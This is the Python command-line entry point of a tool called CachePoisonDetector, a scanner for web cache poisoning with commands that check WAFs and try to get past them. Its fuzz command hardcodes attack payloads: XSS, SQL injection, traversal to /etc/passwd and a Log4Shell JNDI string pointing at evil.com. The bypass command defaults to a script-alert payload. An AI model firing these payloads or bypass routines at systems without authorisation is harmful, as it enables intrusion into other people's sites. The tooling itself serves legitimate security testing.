import click
import sys
import asyncio
from typing import TextIO
from cpd.utils.logger import setup_logger, logger
from cpd.engine import Engine

import os
import time
import json
import requests
from importlib.metadata import version, PackageNotFoundError

def check_for_updates(quiet=False):
    """
    Check for updates on PyPI with local caching to prevent frequent requests.
    """
    cache_dir = os.path.expanduser("~/.cpd")
    cache_file = os.path.join(cache_dir, "update_check.json")
    
    # 1. Ensure cache directory exists
    if not os.path.exists(cache_dir):
        try:
            os.makedirs(cache_dir, exist_ok=True)
        except OSError:
            return # Fail silently if we can't write

    # 2. Check local cache (debounce 24h)
    now = time.time()
    try:
        if os.path.exists(cache_file):
            with open(cache_file, 'r') as f:
                data = json.load(f)
                last_checked = data.get('last_checked', 0)
                # If checked within last 24 hours (86400 seconds), skip
                if now - last_checked < 86400:
                    return
    except Exception:
        pass # Ignore cache read errors

    # 3. Query PyPI
    try:
        # Get installed version
        try:
            current_version = version("cpd-sec")
        except PackageNotFoundError:
            current_version = "0.0.0"

        # Fetch latest from PyPI
        resp = requests.get("https://pypi.org/pypi/cpd-sec/json", timeout=2)
        if resp.status_code == 200:
            info = resp.json()
            latest_version = info['info']['version']
            
            # Simple string comparison or semver? PyPI versions usually sortable.
            # Use packaging.version if available, or simple check.
            # Assuming simple check for now:
            if latest_version != current_version and latest_version > current_version:
                 msg = f"\n[+] A new version of CPD is available ({latest_version})! Run 'pip install --upgrade cpd-sec' to update.\n"
                 if not quiet:
                     click.secho(msg, fg="green", bold=True)
        
        # 4. Update Cache
        with open(cache_file, 'w') as f:
            json.dump({'last_checked': now, 'latest_seen': latest_version}, f)

    except Exception:
        # Fail silently on network errors, timeouts, or parse errors
        pass

def get_version():
    try:
        return version("cpd-sec")
    except PackageNotFoundError:
        return "unknown"

@click.group()
@click.version_option(version=get_version())
@click.option('--verbose', '-v', is_flag=True, help="Enable verbose logging.")
@click.option('--quiet', '-q', is_flag=True, help="Suppress informational output.")
@click.option('--log-level', '-l', help="Set log level (DEBUG, INFO, WARNING, ERROR, CRITICAL). overrides -v and -q.")
def cli(verbose, quiet, log_level):
    """
    CachePoisonDetector (CPD) - A tool for detecting web cache poisoning vulnerabilities.
    """
    setup_logger(verbose, quiet, log_level)
    
    # Auto-check for updates on run (skip if quiet to avoid breaking pipelines)
    if not quiet:
        check_for_updates(quiet=True)

@cli.command()
def update():
    """
    Check for updates and show upgrade instructions.
    """
    logger.info("Checking for updates...")
    # Force check (bypass cache implicitly by always running check logic? No, check_for_updates uses cache)
    # So we should probably bypass cache here.
    
    try:
        from importlib.metadata import version, PackageNotFoundError
        try:
            current = version("cpd-sec")
        except PackageNotFoundError:
            current = "unknown"
            
        logger.info(f"Current version: {current}")
        
        import requests
        resp = requests.get("https://pypi.org/pypi/cpd-sec/json", timeout=5)
        if resp.status_code == 200:
            latest = resp.json()['info']['version']
            if latest != current and latest > current:
                click.secho(f"[+] Update available: {latest}", fg="green", bold=True)
                click.secho("Run the following command to upgrade:", fg="white")
                click.secho("    pip install --upgrade cpd-sec", fg="cyan", bold=True)
            else:
                click.secho(f"[+] You are using the latest version ({current}).", fg="green")
        else:
            logger.error("Failed to fetch update info from PyPI.")
    except Exception as e:
        logger.error(f"Update check failed: {e}")


@cli.command()
@click.option('--url', '-u', help="Single URL to scan.")
@click.option('--file', '-f', type=click.File('r'), help="File containing URLs to scan.")
@click.option('--request-file', '-r', '-burp', type=click.File('r'), help="File containing raw HTTP request (Burp format).")
@click.option('--raw', help="Raw HTTP request string (use with caution).")
@click.option('--concurrency', '-c', type=int, default=None, help="Max concurrent requests.")
@click.option('--header', '-h', multiple=True, help="Custom header (e.g. 'Cookie: foo=bar'). Can be used multiple times.")
@click.option('--output', '-o', help="File to save JSON results to.")
@click.option('--open', 'open_browser', is_flag=True, help="Auto-open HTML report in browser (only works with .html output).")
@click.option('--skip-unstable/--no-skip-unstable', default=None, help="Skip URLs with unstable baselines (default: skip)")
@click.option('--rate-limit', type=int, default=None, help="Rate limit in requests per second (0 for no limit).")
@click.option('--config', help="Path to YAML configuration file.")
@click.option('--no-waf-bypass', is_flag=True, help="Disable automatic WAF bypass.")
@click.pass_context
def scan(ctx, url, file, request_file, raw, concurrency, header, output, open_browser, skip_unstable, rate_limit, config, no_waf_bypass):
    """
    Scan one or more URLs for cache poisoning vulnerabilities.
    """
    from cpd.utils.parser import parse_raw_request
    from cpd.config import load_config, DEFAULT_CONFIG

    # 1. Load Configuration
    # Prioritize: CLI > Config File > Defaults
    cfg = load_config(config)
    
    # Resolve values
    concurrency = concurrency if concurrency is not None else cfg.get('concurrency', DEFAULT_CONFIG['concurrency'])
    rate_limit = rate_limit if rate_limit is not None else cfg.get('rate_limit', DEFAULT_CONFIG['rate_limit'])
    
    # Boolean flag logic: if CLI is None, use config, else use CLI
    if skip_unstable is None:
        skip_unstable = cfg.get('skip_unstable', DEFAULT_CONFIG['skip_unstable'])
        
    enable_waf_bypass = cfg.get('enable_waf_bypass', DEFAULT_CONFIG['enable_waf_bypass'])
    if ctx.params.get('no_waf_bypass'): # Check if flag was explicitly set
         enable_waf_bypass = False


    # Merge headers: start with config headers, update with CLI headers
    config_headers = cfg.get('headers', {})
    
    # Parse CLI headers
    cli_headers = {}
    if header:
        for h in header:
            if ':' in h:
                key, value = h.split(':', 1)
                cli_headers[key.strip()] = value.strip()
            else:
                logger.warning(f"Invalid header format: {h}. Expected 'Key: Value'")
    
    # Combine (CLI overrides Config)
    custom_headers = config_headers.copy()
    custom_headers.update(cli_headers)

    urls = []
    if url:
        urls.append(url)
    
    if file:
        for line in file:
            line = line.strip()
            if line:
                urls.append(line)
    
    # Check for stdin
    if not url and not file and not sys.stdin.isatty():
        for line in sys.stdin:
            line = line.strip()
            if line:
                urls.append(line)

    if not urls:
        # Handle Raw Request
        if request_file or raw:
            content = request_file.read() if request_file else raw
            try:
                parsed = parse_raw_request(content)
                logger.info(f"Loaded raw request: {parsed['method']} {parsed['url']}")
                urls.append(parsed['url'])
                
                # Merge headers
                combined = parsed['headers']
                combined.update(custom_headers)
                custom_headers = combined
            except Exception as e:
                logger.error(f"Failed to parse raw request: {e}")
                return

    if not urls:
        logger.error("No targets specified. Use --url, --file, --request-file, or pipe URLs via stdin.")
        return

    logger.info(f"Starting scan for {len(urls)} URLs with concurrency {concurrency}")
    
    engine = Engine(
        concurrency=concurrency,
        headers=custom_headers,
        skip_unstable=skip_unstable,
        rate_limit=rate_limit,
        cache_key_allowlist=cfg.get("cache_key_allowlist", DEFAULT_CONFIG["cache_key_allowlist"]),
        cache_key_ignore_params=cfg.get("cache_key_ignore_params", DEFAULT_CONFIG["cache_key_ignore_params"]),
        enforce_header_allowlist=cfg.get("enforce_header_allowlist", DEFAULT_CONFIG["enforce_header_allowlist"]),
        enable_waf_bypass=enable_waf_bypass, 
        waf_max_attempts=cfg.get("waf_max_attempts", DEFAULT_CONFIG["waf_max_attempts"]),
    )
    findings = asyncio.run(engine.run(urls))
    
    if findings:
        import json
        logger.info(f"Total findings: {len(findings)}")
        print(json.dumps(findings, indent=2))
        
        if output:
            try:
                if output.endswith('.html'):
                    from cpd.utils.reporter import Reporter
                    Reporter.generate_html_report(findings, output)
                    logger.info(f"HTML report saved to {output}")
                    
                    # Auto-open in browser if --open flag is set
                    if open_browser:
                        import webbrowser
                        import os
                        abs_path = os.path.abspath(output)
                        webbrowser.open(f'file://{abs_path}')
                        logger.info(f"Opening report in browser: {abs_path}")
                else:
                    with open(output, 'w') as f:
                        json.dump(findings, f, indent=2)
                    logger.info(f"Results saved to {output}")
            except IOError as e:
                logger.error(f"Failed to write results to {output}: {e}")
    else:
        logger.info("No vulnerabilities found.")

@cli.command()
@click.option('--url', '-u', required=True, help="Target URL to validate.")
@click.option('--header', '-H', required=True, help="Header to inject (e.g. 'X-Forwarded-Host: evil.com').")
@click.option('--method', '-m', default="GET", help="HTTP Method (default: GET).")
@click.option('--body', '-b', help="Request body.")
def validate(url, header, method, body):
    """
    Manually validate a potential vulnerability by running a step-by-step analysis.
    """
    import asyncio
    import time
    from cpd.http_client import HttpClient
    
    async def _run_validation():
        headers = {}
        if ':' in header:
            key, value = header.split(':', 1)
            headers[key.strip()] = value.strip()
        else:
            logger.error("Invalid header format. Expected 'Key: Value'")
            return

        async with HttpClient() as client:
            # 1. Baseline
            logger.info("[1/4] Fetching Baseline...")
            cb_base = f"cb={int(time.time())}_base"
            url_base = f"{url}?{cb_base}" if '?' not in url else f"{url}&{cb_base}"
            baseline = await client.request(method, url_base, data=body)
            if not baseline:
                logger.error("Failed to fetch baseline.")
                return
            logger.info(f"Baseline: Status {baseline['status']}, Length {len(baseline['body'])}")

            # 2. Poison Attempt
            logger.info(f"[2/4] Attempting Poison with {header}...")
            cb_poison = f"cb={int(time.time())}_poison"
            url_poison = f"{url}?{cb_poison}" if '?' not in url else f"{url}&{cb_poison}"
            poison = await client.request(method, url_poison, headers=headers, data=body)
            if not poison:
                logger.error("Failed to fetch poison request.")
                return
            
            logger.info(f"Poison Response: Status {poison['status']}, Length {len(poison['body'])}")
            
            # Check if poison differed from baseline (ignoring cache buster diffs)
            # We can't strict check body because timestamps might change, but check status/headers
            if poison['status'] != baseline['status']:
                 logger.info(f"-> Poison caused status change: {baseline['status']} -> {poison['status']}")
            elif len(poison['body']) != len(baseline['body']):
                 logger.info(f"-> Poison caused length change: {len(baseline['body'])} -> {len(poison['body'])}")
            else:
                 logger.warning("-> Poison response identical to baseline (ignoring body content). Attack might have failed.")

            # 3. Verification (Clean Request)
            logger.info("[3/4] Verifying (Fetching clean URL with same cache key)...")
            # Reuse url_poison which has the cache buster we tried to poison
            verify = await client.request("GET", url_poison)
            if not verify:
                logger.error("Failed to fetch verify request.")
                return

            logger.info(f"Verify Response: Status {verify['status']}, Length {len(verify['body'])}")
            
            is_hit = False
            if verify['body'] == poison['body']:
                logger.info("-> Verify match Poison: YES (Potential Cache Hit)")
                is_hit = True
            else:
                logger.info("-> Verify match Poison: NO (Cache Miss or Dynamic)")

            if verify['body'] == baseline['body']:
                 logger.info("-> Verify match Baseline: YES")
            
            # 4. Fresh Baseline (Drift Check)
            logger.info("[4/4] Checking Fresh Baseline (for drift)...")
            cb_fresh = f"cb={int(time.time())}_fresh"
            url_fresh = f"{url}?{cb_fresh}" if '?' not in url else f"{url}&{cb_fresh}"
            fresh = await client.request(method, url_fresh, data=body)
            
            logger.info(f"Fresh Response: Status {fresh['status']}, Length {len(fresh['body'])}")
            
            # Final Analysis
            print("\n--- Analysis ---")
            if not is_hit:
                print("RESULT: Safe. Verification request did not return the poisoned content.")
                return

            # It was a hit (Verify == Poison)
            # Logic Fix Check:
            if len(fresh['body']) == len(verify['body']):
                 print("RESULT: False Positive (Benign).")
                 print("Reason: The 'poisoned' content is identical length to a fresh baseline.")
                 print("The server likely ignored the malicious header, and the site returned standard dynamic content.")
                 return
            
            if fresh['body'] == verify['body']:
                 print("RESULT: False Positive (Drift).")
                 print("Reason: Fresh baseline matches the 'poisoned' content. The site just changed naturally.")
                 return

            print("RESULT: POTENTIAL VULNERABILITY!")
            print("Reason: Verification matched Poison, but Fresh Baseline differs.")
            print("The cache appears to be poisoning clean requests with the malicious response.")

    asyncio.run(_run_validation())

    asyncio.run(_run_validation())

@cli.command("waf-detect")
@click.option('--url', '-u', required=True, help="Target URL to check.")
def waf_detect(url):
    """
    Check if a site is protected by a WAF.
    """
    from cpd.logic.waf_bypass import WAFDetector
    from cpd.http_client import HttpClient
    
    async def _run():
        detector = WAFDetector()
        async with HttpClient() as client:
            name, confidence = await detector.detect(client, url)
            if name:
                click.secho(f"[+] WAF Detected: {name}", fg="red", bold=True)
                click.secho(f"[+] Confidence: {confidence}%", fg="yellow")
            else:
                click.secho("[-] No WAF detected.", fg="green")
                
    asyncio.run(_run())

@cli.command("waf-bypass")
@click.option('--url', '-u', required=True, help="Target URL.")
@click.option('--payload', '-p', default="<script>alert(1)</script>", help="Payload to bypass with.")
@click.option('--header', '-H', help="Header name to inject into (optional).")
@click.option('--max-attempts', default=50, help="Max bypass attempts.")
@click.option('--output', '-o', help="Save successful bypasses to JSON.")
def waf_bypass(url, payload, header, max_attempts, output):
    """
    Test WAF bypass techniques.
    """
    from cpd.logic.waf_bypass import WAFBypassEngine
    from cpd.http_client import HttpClient
    
    async def _run():
        engine = WAFBypassEngine()
        async with HttpClient() as client:
             # Detect first
             name, conf = await engine.detector.detect(client, url)
             if name:
                 click.secho(f"[+] WAF Detected: {name} ({conf}%)", fg="red")
             
             headers_dict = {}
             if header:
                  # If header provided, we assume payload goes into that header
                  headers_dict[header] = payload
             
             click.secho(f"[*] Generating bypasses for payload: {payload}", fg="cyan")
             success, bypasses = await engine.analyze_and_bypass(client, url, payload, headers_dict)
             
             if not success or not bypasses:
                 click.secho("[-] Failed to generate bypasses.", fg="red")
                 return

             results = []
             click.secho(f"[*] Testing {min(len(bypasses), max_attempts)} techniques...", fg="cyan")
             
             for i, bypass in enumerate(bypasses[:max_attempts]):
                 is_success = await engine.test_bypass_success(client, url, bypass)
                 status_symbol = "✓" if is_success else "✗"
                 color = "green" if is_success else "red"
                 
                 click.secho(f"  {status_symbol} [{i+1}/{len(bypasses)}] {bypass['technique']}", fg=color)
                 
                 if is_success:
                     results.append(bypass)

             click.secho("\n============================================================", fg="white")
             click.secho(f"  Total Tested: {min(len(bypasses), max_attempts)}", fg="white")
             click.secho(f"  Successful: {len(results)}", fg="green", bold=True)
             
             if results and output:
                 with open(output, 'w') as f:
                     json.dump(results, f, indent=2)
                 click.secho(f"[+] Saved {len(results)} successful bypasses to {output}", fg="blue")

    asyncio.run(_run())

@cli.command("waf-fuzz")
@click.option('--url', '-u', required=True, help="Target URL.")
@click.option('--wordlist', '-w', type=click.File('r'), help="Custom wordlist file.")
def waf_fuzz(url, wordlist):
    """
    Fuzz WAF with payloads to see what gets blocked.
    """
    from cpd.http_client import HttpClient
    import urllib.parse
    
    payloads = [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../etc/passwd",
        "${jndi:ldap://evil.com}",
        "javascript:alert(1)"
    ]
    
    if wordlist:
        payloads = [line.strip() for line in wordlist if line.strip()]
        
    async def _run():
        async with HttpClient() as client:
            click.secho(f"[*] Fuzzing {len(payloads)} payloads against {url}...", fg="cyan")
            
            blocked = 0
            passed = 0
            
            for p in payloads:
                # Inject in query param for simple fuzzing
                target = f"{url}?fuzz={urllib.parse.quote(p)}" if '?' not in url else f"{url}&fuzz={urllib.parse.quote(p)}"
                resp = await client.request("GET", target)
                
                if resp and resp['status'] in [403, 406]:
                    click.secho(f"  [BLOCKED] {p}", fg="red")
                    blocked += 1
                else:
                    click.secho(f"  [PASSED]  {p}", fg="green")
                    passed += 1
            
            click.echo(f"\nStats: Blocked: {blocked}, Passed: {passed}")

    asyncio.run(_run())

if __name__ == "__main__":
    cli()
